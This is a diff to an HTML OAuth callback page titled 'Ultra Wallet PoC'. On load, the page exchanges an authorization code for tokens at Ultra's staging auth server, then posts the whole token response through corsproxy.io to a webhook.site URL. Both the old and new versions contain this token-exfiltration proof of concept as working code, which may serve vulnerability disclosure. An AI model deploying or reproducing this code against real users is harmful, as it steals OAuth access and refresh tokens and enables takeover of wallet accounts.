@@ -1,33 +1,50 @@
-<script>
-  async function exchangeCode() {
-    const urlParams = new URLSearchParams(window.location.search);
-    const code = urlParams.get("code");
-    const codeVerifier = sessionStorage.getItem("code_verifier");
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Ultra Wallet PoC - Callback</title>
+</head>
+<body>
+  <h1>✅ Callback Received</h1>
+  <pre id="result">Waiting...</pre>
 
-    const data = new URLSearchParams({
-      grant_type: "authorization_code",
-      client_id: "2f6ca3c9-87ec-4042-a464-21349485a16f",
-      code,
-      code_verifier: codeVerifier,
-      redirect_uri: "https://nathanogaga118.github.io/ultra-poc/callback.html"
-    });
+  <!-- ⬇️ Move the script to the very end -->
+  <script>
+    async function exchangeCode() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const code = urlParams.get("code");
+      const codeVerifier = sessionStorage.getItem("code_verifier");
 
-    const response = await fetch("https://auth.staging.ultra.io/auth/realms/ultraio/protocol/openid-connect/token", {
-      method: "POST",
-      headers: { "Content-Type": "application/x-www-form-urlencoded" },
-      body: data
-    });
+      const data = new URLSearchParams({
+        grant_type: "authorization_code",
+        client_id: "2f6ca3c9-87ec-4042-a464-21349485a16f",
+        code,
+        code_verifier: codeVerifier,
+        redirect_uri: "https://nathanogaga118.github.io/ultra-poc/callback.html"
+      });
 
-    const result = await response.json();
-    document.getElementById("result").textContent = JSON.stringify(result, null, 2);
+      const response = await fetch("https://auth.staging.ultra.io/auth/realms/ultraio/protocol/openid-connect/token", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: data
+      });
 
-    // ✅ CORS bypass using proxy
-    fetch("https://corsproxy.io/?" + encodeURIComponent("https://webhook.site/6e1baddf-015d-41aa-8d1c-93b57595aa9b"), {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(result)
-    });
-  }
+      const result = await response.json();
 
-  exchangeCode();
-</script>
+      // ✅ Make sure the element exists
+      const resultElem = document.getElementById("result");
+      if (resultElem) {
+        resultElem.textContent = JSON.stringify(result, null, 2);
+      }
+
+      // ✅ Send to webhook using proxy
+      fetch("https://corsproxy.io/?" + encodeURIComponent("https://webhook.site/6e1baddf-015d-41aa-8d1c-93b57595aa9b"), {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(result)
+      });
+    }
+
+    exchangeCode();
+  </script>
+</body>
+</html>
